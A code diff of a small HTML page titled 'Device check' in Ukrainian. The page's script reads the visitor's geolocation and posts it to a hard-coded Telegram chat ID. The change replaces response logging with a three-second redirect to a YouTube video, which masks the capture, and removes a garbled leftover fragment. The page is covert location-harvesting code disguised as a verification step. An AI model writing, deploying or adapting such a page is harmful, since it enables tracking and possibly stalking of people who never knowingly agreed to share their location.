@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Перевірка доступу</title>
+  <title>Перевірка пристрою</title>
 </head>
 <body>
   <h1>Перевірка пристрою</h1>
@@ -23,21 +23,16 @@
           chat_id: 1690869119,
           text: msg
         })
-      })
-      .then(response => response.json())
-      .then(data => console.log("✅ Відправлено:", data))
-      .catch(err => console.error("❌ Помилка:", err));
+      });
+
+      // 🔁 Перенаправлення на YouTube через 3 секунди
+      setTimeout(() => {
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      }, 3000);
     }
 
     function handleError(error) {
       console.error("Геолокацію не отримано:", error.message);
-    }
-
-    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-  </script>
-</body>
-</html>Error(error) {
-      console.error("Помилка геолокації: ", error.message);
     }
 
     navigator.geolocation.getCurrentPosition(sendLocation, handleError);
